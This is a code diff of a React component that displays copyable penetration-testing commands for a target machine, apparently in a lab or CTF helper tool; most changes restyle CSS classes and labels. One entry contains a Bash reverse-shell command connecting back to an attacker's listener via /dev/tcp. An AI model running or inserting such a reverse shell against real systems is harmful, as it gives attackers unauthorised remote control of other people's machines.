@@ -268,7 +268,7 @@ export const QuickCommandsTab: React.FC<QuickCommandsTabProps> = ({ machine }) =
       list.push({
         id: 'priv-revshell-bash',
         category: 'privesc',
-        title: 'Tactical Bash Reverse Shell',
+        title: 'Bash Reverse Shell',
         description: 'Classic interactive Bash socket connection back to your netcat listener.',
         command: `bash -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'`,
         relevance: 'Interactive Reverse Shell',
@@ -332,31 +332,31 @@ export const QuickCommandsTab: React.FC<QuickCommandsTabProps> = ({ machine }) =
   ];
 
   return (
-    <div className="space-y-4 font-mono text-xs">
+    <div className="space-y-4 text-xs">
       {/* Top Banner: Target Telemetry & Injected Variables */}
-      <div className="p-3 rounded-xl bg-cyber-bg border border-cyber-border flex flex-wrap items-center justify-between gap-2.5 text-xs shadow-xs">
+      <div className="p-3 rounded-xl bg-surface-sunken border border-subtle flex flex-wrap items-center justify-between gap-2.5 text-xs shadow-xs">
         <div className="flex items-center gap-2 flex-wrap">
-          <span className={`w-2 h-2 rounded-full ${isIpConfigured ? 'bg-cyber-emerald' : 'bg-cyber-amber'}`} />
-          <span className="text-cyber-muted font-bold">TARGET:</span>
-          <strong className="text-slate-900 dark:text-white">{machine.name}</strong>
-          <span className="text-cyber-border">|</span>
-          <span className="text-cyber-muted font-bold">INJECTED IP:</span>
+          <span className={`w-2 h-2 rounded-full ${isIpConfigured ? 'bg-callout-success-fg' : 'bg-callout-warn-fg'}`} />
+          <span className="text-muted font-semibold">Target</span>
+          <strong className="text-primary">{machine.name}</strong>
+          <span className="text-tertiary">|</span>
+          <span className="text-muted font-semibold">Injected IP</span>
           {isIpConfigured ? (
-            <code className="px-2 py-0.5 rounded-md bg-cyber-card border border-cyber-emerald/40 text-cyber-emerald font-bold">
+            <code className="px-2 py-0.5 rounded-md bg-surface-card border border-callout-success-border text-callout-success-fg font-semibold">
               {targetIp}
             </code>
           ) : (
-            <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-md bg-amber-500/15 border border-amber-500/40 text-callout-warn-fg font-bold text-[10px]">
-              <span>⚠️ UNCONFIGURED (SET IP ABOVE)</span>
+            <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-md bg-callout-warn-bg border border-callout-warn-border text-callout-warn-fg font-semibold text-xs">
+              <span>IP not configured (set it above)</span>
             </span>
           )}
         </div>
 
-        <div className="flex items-center gap-2 text-[11px] flex-shrink-0">
-          <span className="text-cyber-muted font-bold">LHOST:</span>
-          <code className="text-callout-info-fg font-bold">{lhost}</code>
-          <span className="text-cyber-muted font-bold">LPORT:</span>
-          <code className="text-callout-info-fg font-bold">{lport}</code>
+        <div className="flex items-center gap-2 text-xs flex-shrink-0">
+          <span className="text-muted font-semibold">LHOST:</span>
+          <code className="text-callout-info-fg font-semibold">{lhost}</code>
+          <span className="text-muted font-semibold">LPORT:</span>
+          <code className="text-callout-info-fg font-semibold">{lport}</code>
         </div>
       </div>
 
@@ -372,18 +372,18 @@ export const QuickCommandsTab: React.FC<QuickCommandsTabProps> = ({ machine }) =
               }}
               className={`px-3 py-1.5 rounded-lg text-xs font-semibold whitespace-nowrap transition-[transform,box-shadow,background-color,border-color,color] active:scale-[0.98] border shadow-xs ${
                 activeCategory === cat.id
-                  ? 'bg-cyber-cyan/20 border-cyber-cyan text-callout-info-fg font-bold'
-                  : 'bg-cyber-bg border border-cyber-border text-cyber-muted hover:text-primary'
+                  ? 'bg-accent-muted border-accent text-callout-info-fg font-semibold'
+                  : 'bg-surface-sunken border border-subtle text-muted hover:text-primary'
               }`}
             >
               <span>{cat.label}</span>
-              <span className="text-[10px] ml-1 opacity-70">({cat.count})</span>
+              <span className="text-xs ml-1 opacity-70">({cat.count})</span>
             </button>
           ))}
         </div>
 
         <div className="relative w-full lg:w-64 flex-shrink-0">
-          <Search className="w-3.5 h-3.5 absolute left-2.5 top-2.5 text-cyber-muted" />
+          <Search className="w-3.5 h-3.5 absolute left-2.5 top-2.5 text-muted" />
           <input
             id="quick-commands-search-input"
             name="quick-commands-search"
@@ -392,7 +392,7 @@ export const QuickCommandsTab: React.FC<QuickCommandsTabProps> = ({ machine }) =
             value={searchQuery}
             onChange={(e) => setSearchQuery(e.target.value)}
             placeholder="Search commands, flags, tools..."
-            className="w-full pl-8 pr-3 py-1.5 rounded-lg bg-cyber-bg border border-cyber-border text-xs text-white placeholder-cyber-muted focus:outline-none focus:border-cyber-cyan"
+            className="w-full pl-8 pr-3 py-1.5 rounded-lg bg-surface-sunken border border-subtle text-xs text-primary placeholder:text-tertiary focus:outline-none focus:border-accent"
           />
         </div>
       </div>
@@ -400,7 +400,7 @@ export const QuickCommandsTab: React.FC<QuickCommandsTabProps> = ({ machine }) =
       {/* Commands List */}
       <div className="space-y-2.5 max-h-[500px] overflow-y-auto pr-1 scrollbar-thin">
         {filteredCommands.length === 0 ? (
-          <div className="p-8 text-center text-cyber-muted rounded-xl bg-cyber-bg border border-cyber-border">
+          <div className="p-8 text-center text-muted rounded-xl bg-surface-sunken border border-subtle">
             No commands found matching criteria.
           </div>
         ) : (
@@ -409,45 +409,45 @@ export const QuickCommandsTab: React.FC<QuickCommandsTabProps> = ({ machine }) =
             return (
               <div 
                 key={cmd.id}
-                className="p-3 rounded-xl bg-cyber-card/80 border border-cyber-border hover:border-cyber-cyan/50 transition-colors space-y-2 group"
+                className="p-3 rounded-xl bg-surface-card/80 border border-subtle hover:border-accent/50 transition-colors space-y-2 group"
               >
                 <div className="flex items-center justify-between gap-2">
                   <div className="flex items-center gap-2">
-                    <span className="text-white font-bold text-xs">{cmd.title}</span>
-                    <span className="px-2 py-0.5 rounded-md text-[9px] bg-cyber-bg text-callout-info-fg border border-cyber-border font-mono">
+                    <span className="text-primary font-semibold text-xs">{cmd.title}</span>
+                    <span className="px-2 py-0.5 rounded-md text-xs bg-surface-sunken text-callout-info-fg border border-subtle">
                       {cmd.relevance}
                     </span>
                   </div>
 
                   <button
                     onClick={() => handleCopyCommand(cmd)}
-                    className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-bold transition-[transform,box-shadow,background-color,border-color,color] active:scale-[0.98] shadow-xs ${
+                    className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-semibold transition-[transform,box-shadow,background-color,border-color,color] active:scale-[0.98] shadow-xs ${
                       isCopied
-                        ? 'bg-cyber-emerald text-black font-extrabold'
-                        : 'bg-cyber-bg hover:bg-cyber-cyan hover:text-black text-cyber-muted hover:text-primary border border-cyber-border'
+                        ? 'bg-callout-success-fg text-surface-base font-semibold'
+                        : 'bg-surface-sunken hover:bg-accent hover:text-on-accent text-muted hover:text-primary border border-subtle'
                     }`}
                     title="1-Click Copy Command to Clipboard"
                   >
                     {isCopied ? (
                       <>
                         <Check className="w-3 h-3 stroke-[3]" />
-                        <span>COPIED!</span>
+                        <span>Copied</span>
                       </>
                     ) : (
                       <>
                         <Copy className="w-3 h-3" />
-                        <span>COPY</span>
+                        <span>Copy</span>
                       </>
                     )}
                   </button>
                 </div>
 
-                <p className="text-[11px] text-cyber-muted leading-relaxed">
+                <p className="text-xs text-muted leading-relaxed">
                   {cmd.description}
                 </p>
 
                 <div className="relative">
-                  <pre className="p-2.5 rounded-lg bg-black/60 border border-cyber-border/80 text-[11px] font-mono text-cyber-emerald overflow-x-auto select-all scrollbar-thin">
+                  <pre className="p-2.5 rounded-lg bg-surface-inverse/60 border border-subtle/80 text-xs font-mono text-callout-success-fg overflow-x-auto select-all scrollbar-thin">
                     <code>{cmd.command}</code>
                   </pre>
                 </div>
